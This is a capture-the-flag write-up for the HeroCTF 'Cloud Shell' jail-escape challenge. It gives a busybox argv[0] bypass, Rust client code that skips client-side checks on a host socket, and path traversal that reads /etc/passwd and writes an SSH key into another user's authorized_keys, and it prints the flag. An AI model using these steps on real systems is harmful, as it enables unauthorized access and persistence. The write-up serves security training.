# Cloud Shell

### Category

System

### Desription

Cloud cloud cloud... always cloud, but with an access to a shell ? Such a great idea ! :D

Credentials: `restricted:restricted`

> Deploy on [deploy.heroctf.fr](https://deploy.heroctf.fr/)

Format : **Hero{flag}**<br>
Author : **Worty**

### Write Up

This challenge is about jail and communication with the host. When we arrive on the SSH instance, we see that a few folders are accessible, we are in a chroot jail.

We have the following binaries :

```sh
$ ls /bin
cat    cloud_cat    cloud_create    cloud_list    cloud_mv    ls    sh
```

As the challenge is using busybox, we can bypass the binary restriction using the following exploit :

```sh
$ sh -c 'exec -a "whoami" /bin/ls'
restricted
```

Something weird is that all cloud_* binaries as the same size, in fact, they are the same binary. The original binary is just using argv[0] to resolve the function that must be executed.

If we recover locally one of the cloud_* binary, we can see that checks are implemented in the client and that the challenge is using (inside the jail), the socket `/dev/cloud_socket` to communicate with the host.

Here there are two ways of solving the chall :
    - Reverse the binary to understand how he communicates
    - Use socat and create a fake file `/dev/cloud_socket` on your local machine to intercept messages sent.

After that, we can recompile something like this in order to remove the checks :

```rust
use std::env;
use std::io::{self, Read, Write};
use std::os::unix::net::UnixStream;
use std::path::Path;

const SOCKET_PATH: &str = "/dev/cloud_socket";

fn send_tlv_message(stream: &mut UnixStream, tlv_type: u8, value: &[u8]) -> io::Result<()> {
    let length = value.len() as u8;
    let mut message = Vec::new();
    message.push(tlv_type);
    message.push(length);
    message.extend_from_slice(value);

    stream.write_all(&message)?;
    Ok(())
}

fn receive_response(stream: &mut UnixStream) -> io::Result<String> {
    let mut size_buffer = [0u8; 8];
    stream.read_exact(&mut size_buffer)?;
    let message_size = u64::from_be_bytes(size_buffer);

    let mut buffer = vec![0; message_size as usize];
    stream.read_exact(&mut buffer)?;

    Ok(String::from_utf8_lossy(&buffer).to_string())
}

fn cloud_list() -> io::Result<()> {
    let mut stream = UnixStream::connect(SOCKET_PATH)?;
    send_tlv_message(&mut stream, 1, &[])?;
    let response = receive_response(&mut stream)?;
    println!("{}", response);
    Ok(())
}

fn cloud_cat(file_name: &str) -> io::Result<()> {
    let mut stream = UnixStream::connect(SOCKET_PATH)?;
    send_tlv_message(&mut stream, 2, file_name.as_bytes())?;
    let response = receive_response(&mut stream)?;
    println!("{}", response);
    Ok(())
}

fn cloud_mv(old_name: &str, new_name: &str) -> io::Result<()> {
    let mut stream = UnixStream::connect(SOCKET_PATH)?;
    let mut value = Vec::new();
    value.extend_from_slice(old_name.as_bytes());
    value.push(0); // Délimiteur NULL
    value.extend_from_slice(new_name.as_bytes());
    send_tlv_message(&mut stream, 3, &value)?;
    let response = receive_response(&mut stream)?;
    println!("{}", response);
    Ok(())
}

fn cloud_create(file_name: &str, content: &str) -> io::Result<()> {
    let mut stream = UnixStream::connect(SOCKET_PATH)?;
    let mut value = Vec::new();
    value.extend_from_slice(file_name.as_bytes());
    value.push(0); // Délimiteur NULL
    value.extend_from_slice(content.as_bytes());
    send_tlv_message(&mut stream, 4, &value)?;
    let response = receive_response(&mut stream)?;
    println!("{}", response);
    Ok(())
}

fn main() -> io::Result<()> {
    // Récupérer le nom du programme (ARGV[0])
    let program_name = env::args().next().unwrap();
    let program_name = Path::new(&program_name)
        .file_name()
        .unwrap()
        .to_string_lossy();

    let args: Vec<String> = env::args().skip(1).collect();

    match program_name.as_ref() {
        "cloud_list" => {
            // Lister le répertoire, aucun argument supplémentaire nécessaire
            cloud_list()
        }
        "cloud_cat" => {
            if args.len() != 1 {
                eprintln!("Usage: cloud_cat <file_name>");
                return Ok(());
            }
            cloud_cat(&args[0])
        }
        "cloud_mv" => {
            if args.len() != 2 {
                eprintln!("Usage: cloud_mv <old_name> <new_name>");
                return Ok(());
            }
            cloud_mv(&args[0], &args[1])
        }
        "cloud_create" => {
            if args.len() != 2 {
                eprintln!("Usage: cloud_create <file_name> <content>");
                return Ok(());
            }
            cloud_create(&args[0], &args[1])
        }
        _ => {
            eprintln!("Méthode inconnue : {}", program_name);
            Ok(())
        }
    }
}
```

We can download this file suing `wget` on the remote instance with the busybox bypass. To verify that this work, we can try to read `/etc/passwd` of the host (note that binaries called below are the compiled version of the above code) :

```
$ ./cloud_cat ../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
gaoler:x:1000:1000:Linux User,,,:/home/gaoler:/bin/sh
restricted:x:1001:1001:Linux User,,,:/home/restricted:/bin/jail
```

So we can read arbitrary files. But we can also create arbitrary files :

```
$ ./cloud_create ../../../../../../tmp/test "test bypass"
File ../../../../../../tmp/test created
$ ./cloud_cat ../../../../../tmp/test
```

As we can create arbitrary files, and we know that a "gaoler" user exists, we can write our ssh-key in his home :

```
$ ./cloud_create ../../../../../../home/gaoler/.ssh/authorized_keys "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGW6pwqNYvzdAtXjf4XJxu9xtdu3tvhumfQr63moxgZ5"
```

We can now ssh as gaoler :

```
$ ssh gaoler@instance -i id_chall
(ssh) $ ls /
[...]
getthatsuperflag
[...]
(ssh) $ /getthatsuperflag
HERO{y0u_3sc4p3_fr0m_cl0ud_sh3ll_06b0c69c3a3ec4a56e761056a9e70d09}
```

### Flag

HERO{y0u_3sc4p3_fr0m_cl0ud_sh3ll_06b0c69c3a3ec4a56e761056a9e70d09}
